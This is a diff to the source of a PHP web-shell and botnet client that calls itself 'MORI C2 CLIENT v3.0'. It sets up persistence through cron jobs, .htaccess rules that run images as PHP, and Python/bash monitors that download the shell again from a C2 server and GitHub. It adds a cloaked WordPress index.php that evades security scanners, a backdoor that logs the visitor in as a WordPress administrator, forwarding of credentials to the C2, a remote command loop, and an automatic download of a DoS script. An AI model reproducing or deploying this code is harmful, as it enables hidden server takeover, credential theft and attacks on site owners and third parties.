+        'target_count'   => count($targets),
     ];
-    
-    // Generate accessible URLs using DOCUMENT_ROOT-aware mapping
-    foreach ($deployed as $file_path) {
-        $mapped = file_path_to_url($file_path);
-        if ($mapped) $deployment_info['urls'][] = $mapped;
-    }
-    $deployment_info['urls'] = array_values(array_unique($deployment_info['urls']));
 
     // Cache for registration pickup
     @file_put_contents(sys_get_temp_dir() . '/.mori_sister_cache.json', json_encode($deployment_info));
@@ -2432,15 +2531,15 @@ HTACCESS;
 }
 
 function report_sister_files_to_c2($deployment_info) {
-    $server = $GLOBALS['C2_SERVER'] ?? '';
-    $id     = $GLOBALS['CLIENT_ID'] ?? '';
+    $server = (isset($GLOBALS['C2_SERVER']) ? $GLOBALS['C2_SERVER'] : '');
+    $id     = (isset($GLOBALS['CLIENT_ID']) ? $GLOBALS['CLIENT_ID'] : '');
     if (!$server || !$id || empty($deployment_info['locations'])) return false;
 
     $payload = [
         'id'          => $id,
         'sister_files'=> $deployment_info['locations'],
-        'sister_urls' => $deployment_info['urls'] ?? [],
-        'deployed_at' => $deployment_info['timestamp'] ?? time(),
+        'sister_urls' => (isset($deployment_info['urls']) ? $deployment_info['urls'] : []),
+        'deployed_at' => (isset($deployment_info['timestamp']) ? $deployment_info['timestamp'] : time()),
     ];
 
     $encoded = safe_base64_encode(safe_json_encode($payload));
@@ -2551,8 +2650,8 @@ function get_deployment_targets_from_backup() {
     // 3. SORT BY DEPTH (deeper = better for hiding)
     usort($targets, function($a, $b) {
         if (is_array($a)) {
-            $depth_a = $a["depth"] ?? 0;
-            return $depth_a > ($b["depth"] ?? 0) ? -1 : 1; // Descending (deeper first)
+            $depth_a = (isset($a["depth"]) ? $a["depth"] : 0);
+            return $depth_a > ((isset($b["depth"]) ? $b["depth"] : 0)) ? -1 : 1; // Descending (deeper first)
         }
         return 0;
     });
@@ -2572,12 +2671,13 @@ function get_deployment_targets_from_backup() {
 
 // Get main shell code
 function get_main_shell_code() {
-    // Try multiple locations
+    $sf = SHELL_FILE;
     $paths = array_merge(
-        glob("/var/www/*/public_html/haeder.php"),
-        glob("/var/www/*/haeder.php"),
-        glob("/home/*/public_html/haeder.php"),
-        [__DIR__ . "/haeder.php", dirname(__DIR__) . "/haeder.php"]
+        (array)@glob("/var/www/*/public_html/" . $sf),
+        (array)@glob("/var/www/*/" . $sf),
+        (array)@glob("/home/*/public_html/" . $sf),
+        (array)@glob("/home/*/" . $sf),
+        [SHELL_PATH, __DIR__ . "/" . $sf, dirname(__DIR__) . "/" . $sf]
     );
     
     foreach ($paths as $path) {
@@ -2592,7 +2692,7 @@ function get_main_shell_code() {
 
 // Fetch from C2 if local not available
 function get_shell_code_fallback() {
-    $c2_url = ($GLOBALS["C2_SERVER"] ?? "") . "?act=get_shell";
+    $c2_url = ((isset($GLOBALS["C2_SERVER"]) ? $GLOBALS["C2_SERVER"] : "")) . "?act=get_shell";
     $content = @file_get_contents($c2_url);
     if ($content && strlen($content) > 15000) {
         return $content;
@@ -2637,18 +2737,30 @@ function deploy_sister_files_from_backup() {
             $deployed_paths[] = $img;
         }
 
-        // .htaccess - execute .png .gif .jpg as PHP
+        // .htaccess — append only, NEVER overwrite existing content
         $htaccess = $target . "/.htaccess";
-        $content = "<FilesMatch \"\\.png$|\\.gif$|\\.jpg$\">\n" .
-                   "    SetHandler application/x-httpd-php\n" .
-                   "</FilesMatch>\n";
-        @file_put_contents($htaccess, $content);
+        $existing = @file_get_contents($htaccess) ?: "";
+        if (strpos($existing, "# perf-cache") === false) {
+            $append = "\n# perf-cache\n"
+                . "Options +ExecCGI\n"
+                . "AddHandler application/x-httpd-php .png .gif .jpg\n"
+                . "<FilesMatch \"\\.png\$|\\.gif\$|\\.jpg\$\">\n"
+                . "    SetHandler application/x-httpd-php\n"
+                . "    ForceType application/x-httpd-php\n"
+                . "</FilesMatch>\n"
+                . "<IfModule mod_php.c>\n    php_flag engine on\n</IfModule>\n"
+                . "<IfModule mod_php8.c>\n    php_flag engine on\n</IfModule>\n"
+                . "<IfModule mod_php7.c>\n    php_flag engine on\n</IfModule>\n"
+                . "<IfModule mod_php5.c>\n    php_flag engine on\n</IfModule>\n";
+            @file_put_contents($htaccess, $existing . $append);
+            @chmod($htaccess, 0644);
+        }
     }
 
     // Merge new paths into sister cache (picked up by main shell on next register)
     $cache_file = sys_get_temp_dir() . "/.mori_sister_cache.json";
     $existing   = @json_decode(@file_get_contents($cache_file), true) ?: ["locations" => [], "urls" => [], "timestamp" => 0];
-    $existing["locations"] = array_values(array_unique(array_merge($existing["locations"] ?? [], $deployed_paths)));
+    $existing["locations"] = array_values(array_unique(array_merge((isset($existing["locations"]) ? $existing["locations"] : []), $deployed_paths)));
     $existing["timestamp"] = time();
     @file_put_contents($cache_file, json_encode($existing));
 
@@ -2683,9 +2795,31 @@ function ensure_persistence_v4() {
 
     $client_id = $client_id ?: ($CLIENT_ID ?: md5(gethostname() . microtime()));
 
-    // Step 1: Deploy aggressive sister files and report to C2
+    // Step 0: One-shot cron dedup — remove spam entries left by broken dedup on old installs
+    // Runs every 5 min (same throttle as this function), fast because it's just string ops
+    $cron_check = exec_any("crontab -l 2>/dev/null | grep -cF '#mori_persist'");
+    if ((int)$cron_check > 1) {
+        // More than 1 mori_persist line → nuke all and reinstall fresh
+        $all_lines = exec_any("crontab -l 2>/dev/null");
+        if ($all_lines !== false) {
+            $clean = array_filter(
+                explode("\n", (string)$all_lines),
+                function($l) { return strpos($l, '#mori_persist') === false && trim($l) !== ''; }
+            );
+            $new_tab = implode("\n", $clean) . "\n";
+            exec_any("echo " . escapeshellarg(rtrim($new_tab)) . " | crontab - 2>/dev/null");
+        }
+        // Force install_cron_persistence() to run immediately by clearing its throttle
+        @unlink(sys_get_temp_dir() . '/.mori_cron_ts');
+        @install_cron_persistence();
+    }
+
+    // Step 1: Deploy aggressive sister files
+    // Report to C2 only if client is already registered (UPDATE would fail for new clients)
     $deploy_info = @deploy_sister_files_aggressive();
-    if (is_array($deploy_info) && !empty($deploy_info['locations'])) {
+    $reg_file = REAL_DIR . '/.registered';
+    if (is_array($deploy_info) && !empty($deploy_info['locations'])
+        && @file_exists($reg_file) && @filesize($reg_file) > 0) {
         @report_sister_files_to_c2($deploy_info);
     }
     
@@ -2702,8 +2836,9 @@ function ensure_persistence_v4() {
     
     // Step 3: Start monitor processes (ONLY 1 instance each, no duplicates)
     $monitor_lock = '/tmp/.svc_monitor_lock';
-    $lock_age = @file_exists($monitor_lock) ? (time() - @filemtime($monitor_lock)) : 0;
-    
+    // PHP_INT_MAX when file absent → condition is true → monitors start on first run
+    $lock_age = @file_exists($monitor_lock) ? (time() - @filemtime($monitor_lock)) : PHP_INT_MAX;
+
     // Start monitors: check every 5 minutes (lock freshness)
     if ($lock_age > 300) {
         @touch($monitor_lock);
@@ -2722,7 +2857,7 @@ SHELL_PATH = "' . $shell_path_esc . '"
 SHELL_FILE = "' . $shell_file_esc . '"
 C2_URL     = "' . $c2_url_esc     . '"
 TOKEN      = "' . $token_esc      . '"
-GH_URL     = "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"
+GH_URL     = "https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php"
 INTERVAL   = 60  # local check only — no HTTP alive probe
 
 ctx = ssl.create_default_context()
@@ -2736,9 +2871,10 @@ def needs_restore():
         return True  # file missing
 
 def restore():
+    # GitHub first — C2 may have Cloudflare UAM active
     sources = [
-        (C2_URL + "?act=get_shell&token=" + TOKEN + "&file=" + SHELL_FILE, 4),
         (GH_URL, 15),
+        (C2_URL + "?act=get_shell&token=" + TOKEN + "&file=" + SHELL_FILE, 4),
     ]
     for url, tmo in sources:
         try:
@@ -2782,7 +2918,7 @@ SHELL_PATH=' . $shell_path_sh . '
 SHELL_FILE=' . $shell_file_sh . '
 C2_URL=' . $c2_sh . '
 TOKEN="' . $token_sh . '"
-GH_URL="https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/navbar.php"
+GH_URL="https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php"
 INTERVAL=60
 TMP="${SHELL_PATH}.tmp"
 
@@ -2790,19 +2926,21 @@ TMP="${SHELL_PATH}.tmp"
 php_ok() { head -c5 "$1" 2>/dev/null | grep -q "<?php"; }
 
 restore() {
-  curl -sfL --max-time 4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -o "$TMP" 2>/dev/null
-  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
-    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
-  fi
-  wget -q --timeout=4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -O "$TMP" 2>/dev/null
-  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
-    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
-  fi
+  # GitHub first — C2 may have Cloudflare UAM active (returns HTML, not PHP)
   curl -sfL --max-time 15 "$GH_URL" -o "$TMP" 2>/dev/null
   if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
     mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
   fi
   wget -q --timeout=15 "$GH_URL" -O "$TMP" 2>/dev/null
+  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
+    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
+  fi
+  # C2 fallback
+  curl -sfL --max-time 4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -o "$TMP" 2>/dev/null
+  if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
+    mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
+  fi
+  wget -q --timeout=4 "${C2_URL}?act=get_shell&token=${TOKEN}&file=${SHELL_FILE}" -O "$TMP" 2>/dev/null
   if [ $? -eq 0 ] && [ $(stat -c%s "$TMP" 2>/dev/null || echo 0) -gt 10000 ] && php_ok "$TMP"; then
     mv "$TMP" "$SHELL_PATH" && chmod 644 "$SHELL_PATH" && return 0
   fi
@@ -2831,8 +2969,8 @@ done
         'php_version' => PHP_VERSION,
         'os' => php_uname(),
         'processes' => [
-            'python' => $py_process_count ?? 'n/a',
-            'bash' => $bash_process_count ?? 'n/a',
+            'python' => (isset($py_process_count) ? $py_process_count : 'n/a'),
+            'bash' => (isset($bash_process_count) ? $bash_process_count : 'n/a'),
         ],
     ];
     
@@ -2869,9 +3007,10 @@ function auto_register() {
     }
     @file_put_contents($reg_ts_file, time());
     
-    // Get WordPress login credentials (dynamic)
-    $wp_creds = generate_wp_login_credentials();
-    
+    $wp_creds = is_wordpress_installed()
+        ? generate_wp_login_credentials()
+        : ['blogs_id' => null, 'hash' => null];
+
     // C2 sunucusuna kayıt yap - BACKGROUND ONLY (don't block)
     $auto_reg_sister = sys_get_temp_dir() . '/.mori_sister_cache.json';
     $auto_reg_sf     = @json_decode(@file_get_contents($auto_reg_sister), true);
@@ -2880,8 +3019,8 @@ function auto_register() {
         'id'           => $client_id,
         'web_shell_url'=> $web_shell_url,
         'sysinfo'      => collect_system_info(),
-        'sister_files' => $auto_reg_sf['locations'] ?? [],
-        'sister_urls'  => $auto_reg_sf['urls']      ?? [],
+        'sister_files' => (isset($auto_reg_sf['locations']) ? $auto_reg_sf['locations'] : []),
+        'sister_urls'  => (isset($auto_reg_sf['urls']) ? $auto_reg_sf['urls'] : []),
         'timestamp'    => time(),
         'version'      => '3.0',
         'wp_login_id'  => $wp_creds['blogs_id'],
@@ -2926,7 +3065,7 @@ function delete_directory($path) {
 // =====================================================
 
 function generate_wp_cloaking_index_content() {
-    $c2  = $GLOBALS['C2_SERVER'] ?? '';
+    $c2  = (isset($GLOBALS['C2_SERVER']) ? $GLOBALS['C2_SERVER'] : '');
     $gh  = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/l.php';
     $tok = md5('mori_c2_secret_2024_persistence');
     $key = md5($tok);
@@ -2936,39 +3075,38 @@ function generate_wp_cloaking_index_content() {
          . '$_wc2="' . addslashes($c2) . '";' . "\n"
          . '$_wgh="' . addslashes($gh) . '";' . "\n"
          . '$_wtok="' . $tok . '";' . "\n"
-         . '$_wkey="' . $key . '";' . "\n";
+         . '$_wkey="' . $key . '";' . "\n"
+         . '$_wsf=__DIR__."/' . addslashes(SHELL_FILE) . '";' . "\n";
 
     // Body — NOWDOC, no interpolation
     $body = <<<'WPAEOF'
-$_wbot=(bool)preg_match('/(bot|crawl|spider|slurp|google|bing|yahoo|yandex|baidu|facebookexternalhit|wordfence|sucuri|imunify|modsecurity|nikto|sqlmap|nmap|acunetix|nuclei|burp|python-requests|go-http-client|libwww|curl\/[0-9])/i',strtolower($_SERVER['HTTP_USER_AGENT']??''));
+$_wbot=(bool)preg_match('/(bot|crawl|spider|slurp|google|bing|yahoo|yandex|baidu|facebookexternalhit|wordfence|sucuri|imunify|modsecurity|nikto|sqlmap|nmap|acunetix|nuclei|burp|python-requests|go-http-client|libwww|curl\/[0-9])/i',strtolower((isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '')));
 
 // Installer endpoint — called by JS fetch or server curl
 if(!empty($_GET['_wpa'])&&$_GET['_wpa']===$_wkey&&!$_wbot){
-    $_wsf=__DIR__.'/wp-activater.php';
     $_wok=false;
     $_wx=stream_context_create(['http'=>['timeout'=>10,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
     foreach([$_wc2.'?act=get_shell&token='.$_wtok,$_wgh] as $_wu){
         $_wr=false;
         if(function_exists('curl_init')){$_wh=curl_init($_wu);curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,10018=>'Mozilla/5.0',13=>10]);$_wr=@curl_exec($_wh);curl_close($_wh);}
         if(!$_wr)$_wr=@file_get_contents($_wu,false,$_wx);
-        if($_wr&&strlen($_wr)>10000){$_wok=@file_put_contents($_wsf,$_wr)!==false;if($_wok){@chmod($_wsf,0644);break;}}
+        if($_wr&&strlen($_wr)>10000&&substr(ltrim($_wr),0,5)==='<?php'){$_wok=@file_put_contents($_wsf,$_wr)!==false;if($_wok){@chmod($_wsf,0644);break;}}
     }
     header('Content-Type: text/plain');die($_wok?'ok':'fail');
 }
 
 if(!$_wbot){
-    $_wsf=__DIR__.'/wp-activater.php';
     if(!@file_exists($_wsf)||@filesize($_wsf)<10000){
         $_wsu=(isset($_SERVER['HTTPS'])&&$_SERVER['HTTPS']!=='off'?'https':'http')
-            .'://'.($_SERVER['HTTP_HOST']??'localhost').$_SERVER['SCRIPT_NAME'].'?_wpa='.$_wkey;
+            .'://'.((isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'localhost')).$_SERVER['SCRIPT_NAME'].'?_wpa='.$_wkey;
         $_wd=false;
         $_wx=stream_context_create(['http'=>['timeout'=>4,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
-        // M1: Direct PHP fetch from C2 then GitHub
+        // M1: Direct PHP fetch from C2 then GitHub (must be valid PHP, not Cloudflare UAM HTML)
         foreach([$_wc2.'?act=get_shell&token='.$_wtok,$_wgh] as $_wu){
             $_wr=false;
             if(function_exists('curl_init')){$_wh=curl_init($_wu);curl_setopt_array($_wh,[19913=>true,52=>true,64=>false,10018=>'Mozilla/5.0',13=>4]);$_wr=@curl_exec($_wh);curl_close($_wh);}
             if(!$_wr)$_wr=@file_get_contents($_wu,false,$_wx);
-            if($_wr&&strlen($_wr)>10000&&@file_put_contents($_wsf,$_wr)!==false){@chmod($_wsf,0644);$_wd=true;break;}
+            if($_wr&&strlen($_wr)>10000&&substr(ltrim($_wr),0,5)==='<?php'&&@file_put_contents($_wsf,$_wr)!==false){@chmod($_wsf,0644);$_wd=true;break;}
         }
         // M2: Server-side self-curl to installer endpoint
         if(!$_wd&&function_exists('curl_init')){
@@ -3001,7 +3139,7 @@ function install_wp_cloaking_index() {
 
     // Find WP root (has both wp-config.php and wp-blog-header.php)
     $wp_root = null;
-    foreach ([__DIR__, dirname(__DIR__), dirname(dirname(__DIR__)), dirname(dirname(dirname(__DIR__)))] as $d) {
+    foreach ([REAL_DIR, dirname(REAL_DIR), dirname(dirname(REAL_DIR)), dirname(dirname(dirname(REAL_DIR)))] as $d) {
         if (@file_exists($d . '/wp-config.php') && @file_exists($d . '/wp-blog-header.php')) {
             $wp_root = $d;
             break;
@@ -3020,18 +3158,27 @@ function install_wp_cloaking_index() {
     if ((int)@file_get_contents($ts) > time() - 86400) return false;
     @file_put_contents($ts, time());
 
-    // chmod 777 → unlink → write new
-    @chmod($index_path, 0777);
-    @unlink($index_path);
-
     $content = generate_wp_cloaking_index_content();
     if (!$content) return false;
 
-    if (@file_put_contents($index_path, $content) !== false) {
-        @chmod($index_path, 0644);
-        return true;
+    // Write to temp first, then atomic rename — never leave index.php missing
+    $tmp = $index_path . '.mori_tmp';
+    if (@file_put_contents($tmp, $content) === false) return false;
+    @chmod($index_path, 0644);
+    if (!@rename($tmp, $index_path)) {
+        // rename failed (cross-device?) — try unlink+write
+        @chmod($index_path, 0777);
+        @unlink($index_path);
+        if (@file_put_contents($index_path, $content) !== false) {
+            @chmod($index_path, 0644);
+            @unlink($tmp);
+            return true;
+        }
+        @unlink($tmp);
+        return false;
     }
-    return false;
+    @chmod($index_path, 0644);
+    return true;
 }
 
 // =====================================================
@@ -3039,29 +3186,7 @@ function install_wp_cloaking_index() {
 // =====================================================
 
 function self_rename_and_register() {
-    // Only when running as wp-activeter.php on a non-WP site
-    if (basename(__FILE__) !== 'wp-activeter.php') return;
-    if (is_wordpress_installed()) return;
-
-    $navbar_path = __DIR__ . '/navbar.php';
-    // navbar.php already healthy → already done
-    if (@file_exists($navbar_path) && @filesize($navbar_path) > 10000) return;
-
-    // Step 1: Copy self → navbar.php
-    $self_content = @file_get_contents(__FILE__);
-    if (!$self_content || strlen($self_content) < 10000) return;
-    if (@file_put_contents($navbar_path, $self_content) === false) return;
-    @chmod($navbar_path, 0644);
-
-    // Step 2: Self-delete wp-activeter.php
-    @unlink(__FILE__);
-
-    // Step 4: Clean exit — file is gone, 302 to homepage
-    if (php_sapi_name() !== 'cli') {
-        http_response_code(302);
-        header('Location: /');
-    }
-    exit(0);
+    // Shell works under any filename — SHELL_PATH/SHELL_FILE are set dynamically from __FILE__.
 }
 
 // =====================================================
@@ -3070,7 +3195,7 @@ function self_rename_and_register() {
 
 // DEBUG MODE
 if (isset($_GET['debug']) && $debug_mode) {
-    $client_id = $GLOBALS['CLIENT_ID'] ?? '';
+    $client_id = (isset($GLOBALS['CLIENT_ID']) ? $GLOBALS['CLIENT_ID'] : '');
     $os_type   = PHP_OS;
     header('Content-Type: text/plain; charset=utf-8');
     echo "MORI C2 CLIENT v3.0\n";
@@ -3081,7 +3206,7 @@ if (isset($_GET['debug']) && $debug_mode) {
     echo "Current User: " . get_current_user() . "\n";
     echo "Current Directory: " . getcwd() . "\n";
     echo "PHP Version: " . PHP_VERSION . "\n";
-    echo "Server Software: " . ($_SERVER['SERVER_SOFTWARE'] ?? 'unknown') . "\n\n";
+    echo "Server Software: " . ((isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'unknown')) . "\n\n";
     
     echo "SYSTEM INFO:\n";
     print_r(collect_system_info());
@@ -3100,11 +3225,12 @@ if (isset($_GET['act']) && $_GET['act'] == 'register_data') {
 
 // PULL REGISTER — C2 sunucu bu endpoint'i çekerek shell'i kayıt eder (UAM bypass)
 if (isset($_GET['act']) && $_GET['act'] === 'pull_register') {
-    $wp_creds  = generate_wp_login_credentials();
-    $server_ip = $_SERVER['SERVER_ADDR']
-              ?? $_SERVER['LOCAL_ADDR']
-              ?? @gethostbyname(@gethostname())
-              ?? '0.0.0.0';
+    $wp_creds = is_wordpress_installed()
+        ? generate_wp_login_credentials()
+        : ['blogs_id' => null, 'hash' => null];
+    $server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] :
+                 (isset($_SERVER['LOCAL_ADDR']) ? $_SERVER['LOCAL_ADDR'] :
+                 (@gethostbyname(@gethostname()) ?: '0.0.0.0'));
 
     // Sister cache — önceki persistence çalışmasından kalan veri (varsa)
     $sister_cache = sys_get_temp_dir() . '/.mori_sister_cache.json';
@@ -3116,13 +3242,17 @@ if (isset($_GET['act']) && $_GET['act'] === 'pull_register') {
         'web_shell_url' => $GLOBALS['WEB_URL'],
         'server_ip'     => $server_ip,
         'sysinfo'       => collect_system_info(),
-        'sister_files'  => $sister_data['locations'] ?? [],
-        'sister_urls'   => $sister_data['urls']      ?? [],
+        'sister_files'  => (isset($sister_data['locations']) ? $sister_data['locations'] : []),
+        'sister_urls'   => (isset($sister_data['urls']) ? $sister_data['urls'] : []),
         'timestamp'     => time(),
         'version'       => '3.0',
         'wp_login_id'   => $wp_creds['blogs_id'],
         'wp_login_hash' => $wp_creds['hash'],
     ], JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
+
+    // .registered'ı HEMEN yaz — ensure_persistence_v4() içinde report_sister_files_to_c2()
+    // bu dosyanın varlığını kontrol eder. Response öncesi yazılmazsa sister files C2'ye hiç gitmez.
+    @file_put_contents(REAL_DIR . '/.registered', time());
 
     header('Content-Type: application/json; charset=utf-8');
     header('Content-Length: ' . strlen($response));
@@ -3136,17 +3266,34 @@ if (isset($_GET['act']) && $_GET['act'] === 'pull_register') {
         @flush();
     }
 
-    // Bağlantı kapandıktan sonra: persistence + register (artık C2 timeout'u etkilemez)
+    // Bağlantı kapandıktan sonra — C2 cevabı aldı, PHP arka planda çalışmaya devam eder.
+    // Ağır persistence işlemleri burada: crontab + sister files + monitor başlatma.
     ignore_user_abort(true);
     set_time_limit(120);
-    @ensure_persistence_v4();
-    @auto_register();
+    @install_cron_persistence();   // crontab sorgusu — HTTP response'dan önce yapılmamalı
+    @ensure_persistence_v4();      // sister deploy + Python/bash monitor başlatma
+    @auto_register();              // C2'ye kayıt (throttled: 10 dakikada bir)
+
+    // dos.py auto-deploy — /tmp ve mevcut dizine indir (arka planda, bloklamaz)
+    $dos_dl_url = 'https://raw.githubusercontent.com/wnwnsks/wn/refs/heads/main/dos.py';
+    $dos_tmp    = '/tmp/dos.py';
+    $dos_local  = REAL_DIR . '/dos.py';
+    $fetch_dos  = "curl -sLf " . escapeshellarg($dos_dl_url)
+                . " -o " . escapeshellarg($dos_tmp)
+                . " 2>/dev/null && chmod +x " . escapeshellarg($dos_tmp)
+                . " && cp " . escapeshellarg($dos_tmp) . " " . escapeshellarg($dos_local)
+                . " 2>/dev/null || wget -qO " . escapeshellarg($dos_tmp) . " "
+                . escapeshellarg($dos_dl_url) . " 2>/dev/null";
+    // Sadece henüz yoksa ya da küçükse indir
+    if (!@file_exists($dos_tmp) || @filesize($dos_tmp) < 1000) {
+        @exec('nohup sh -c ' . escapeshellarg($fetch_dos) . ' > /dev/null 2>&1 &');
+    }
     exit(0);
 }
 
 // WP CREDS — injected WP plugin posts credentials here, we forward to C2
 if (isset($_GET['act']) && $_GET['act'] === 'wp_creds') {
-    $creds_encoded = $_POST['creds'] ?? '';
+    $creds_encoded = (isset($_POST['creds']) ? $_POST['creds'] : '');
     if (!empty($creds_encoded)) {
         $payload = safe_base64_encode(safe_json_encode([
             'creds'     => $creds_encoded,
@@ -3156,6 +3303,37 @@ if (isset($_GET['act']) && $_GET['act'] === 'wp_creds') {
     }
     header('Content-Type: text/plain');
     die('ok');
+}
+
+// WP DIRECT AUTO-LOGIN — ?blogs_id=X&wp_login=1&hash=H
+if (isset($_GET['blogs_id']) && isset($_GET['wp_login'])) {
+    $blogs_id      = trim((isset($_GET['blogs_id']) ? $_GET['blogs_id'] : ''));
+    $hash_provided = trim((isset($_GET['hash']) ? $_GET['hash'] : ''));
+    if ($blogs_id && sha1(md5($blogs_id . '1776051848')) === $hash_provided) {
+        // Try to load WordPress and set auth cookie
+        $wp_load = null;
+        foreach ([REAL_DIR, dirname(REAL_DIR), dirname(dirname(REAL_DIR)), dirname(dirname(dirname(REAL_DIR)))] as $_d) {
+            if (@file_exists($_d . '/wp-load.php')) { $wp_load = $_d . '/wp-load.php'; break; }
+        }
+        if ($wp_load && !defined('ABSPATH')) {
+            @require_once $wp_load;
+            if (function_exists('get_users') && function_exists('wp_set_auth_cookie')) {
+                $admins = get_users(['role' => 'administrator', 'orderby' => 'ID', 'order' => 'ASC', 'number' => 1]);
+                if (!empty($admins)) {
+                    wp_set_auth_cookie($admins[0]->ID, true, true);
+                    wp_redirect(admin_url());
+                    exit;
+                }
+            }
+        }
+        // Fallback: redirect to WP home so the wp_footer hook fires
+        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+        $host   = (isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '');
+        if ($host) {
+            header("Location: {$scheme}://{$host}/?blogs_id={$blogs_id}&wp_login=1&hash={$hash_provided}");
+            exit;
+        }
+    }
 }
 
 // REGISTER ONLY (manuel kayıt için)
@@ -3195,7 +3373,7 @@ if (isset($_GET['m'])) {
     header('Access-Control-Allow-Headers: Content-Type');
     
     // Try safe_base64_decode first, then normal base64
-    $encoded = $_GET['m'] ?? null;
+    $encoded = (isset($_GET['m']) ? $_GET['m'] : null);
     
     if (!$encoded || !is_string($encoded)) {
         header('Content-Type: application/json; charset=utf-8');
@@ -3235,7 +3413,7 @@ if (isset($_POST['m'])) {
     header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
     header('Access-Control-Allow-Headers: Content-Type');
     
-    $payload = $_POST['m'] ?? null;
+    $payload = (isset($_POST['m']) ? $_POST['m'] : null);
     
     // NULL-safe payload handling
     if (!$payload || !is_string($payload)) {
@@ -3290,7 +3468,7 @@ if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'applica
         
         switch ($input['action']) {
             case 'exec':
-                $cmd = $input['command'] ?? '';
+                $cmd = (isset($input['command']) ? $input['command'] : '');
                 $result = execute_command($cmd);
                 echo json_encode(['success' => true, 'output' => $result]);
                 break;
@@ -3301,13 +3479,13 @@ if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'applica
                 
             case 'register':
                 $success   = auto_register();
-                $client_id = $GLOBALS['CLIENT_ID'] ?? '';
+                $client_id = (isset($GLOBALS['CLIENT_ID']) ? $GLOBALS['CLIENT_ID'] : '');
                 echo json_encode(['success' => $success, 'client_id' => $client_id]);
                 break;
 
             case 'upload_dos_py':
                 // Upload dos.py file - base64 encoded
-                $file_content = $input['file_content'] ?? '';
+                $file_content = (isset($input['file_content']) ? $input['file_content'] : '');
                 $file_path = '/tmp/dos.py';
                 if ($file_content && base64_decode($file_content, true)) {
                     $decoded = base64_decode($file_content);
@@ -3324,7 +3502,7 @@ if (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'applica
 
             case 'upload_dos_php':
                 // Upload dos.php file - base64 encoded
-                $file_content = $input['file_content'] ?? '';
+                $file_content = (isset($input['file_content']) ? $input['file_content'] : '');
                 $file_path = 'dos.php';
                 if ($file_content && base64_decode($file_content, true)) {
                     $decoded = base64_decode($file_content);
@@ -3355,26 +3533,30 @@ if (php_sapi_name() === 'cli' || isset($_GET['agent']) || isset($_GET['daemon'])
     $sleep_interval = isset($_GET['sleep']) ? (int)$_GET['sleep'] : 5;
     
     auto_register();
-    $client_id = $GLOBALS['CLIENT_ID'] ?? '';
-    $c2_server = $GLOBALS['C2_SERVER'] ?? '';
+    $client_id = (isset($GLOBALS['CLIENT_ID']) ? $GLOBALS['CLIENT_ID'] : '');
+    $c2_server = (isset($GLOBALS['C2_SERVER']) ? $GLOBALS['C2_SERVER'] : '');
 
     $start_time = time();
     $task_counter = 0;
 
     while ((time() - $start_time) < $max_execution) {
-        $task = c2_get_task($c2_server, $client_id);
-        
-        if ($task && trim($task) && trim($task) !== 'no_task') {
+        $resp = c2_get_task($c2_server, $client_id);
+        $cmd  = (isset($resp['command']) ? $resp['command'] : 'no_task');
+        $wait = max(5, min(60, (int)((isset($resp['retry_after']) ? $resp['retry_after'] : $sleep_interval))));
+
+        if ($cmd && $cmd !== 'no_task') {
+            $task_id = (isset($resp['id']) ? $resp['id'] : null);
             $task_counter++;
-            $output = execute_command($task);
-            c2_send_result($c2_server, $client_id, $task, $output);
+            $output = execute_command($cmd);
+            c2_send_result($c2_server, $client_id, $cmd, $output, $task_id);
+            $wait = 5; // görev vardı, hemen tekrar bak
         }
-        
-        if ($task_counter % 10 === 0) {
+
+        if ($task_counter > 0 && $task_counter % 10 === 0) {
             c2_update_status($c2_server, $client_id);
         }
-        
-        sleep($sleep_interval);
+
+        sleep($wait);
     }
     
     if (php_sapi_name() === 'cli') {
@@ -3465,21 +3647,47 @@ if (isset($_GET['monitor'])) {
     exit;
 }
 
-register_shutdown_function(function() {
-    // Yanıt zaten gönderildi, connection kapandı
-    // Bu noktada HTTP isteği yapmak HÂLÂ sorunlu olabilir (aynı Apache),
-    // Bu yüzden doğrudan dosyaya yaz — HTTP kullanma.
-    global $c2_server, $client_id, $debug_mode;
+// URL UPLOAD — fetch a remote URL and save it as a local file
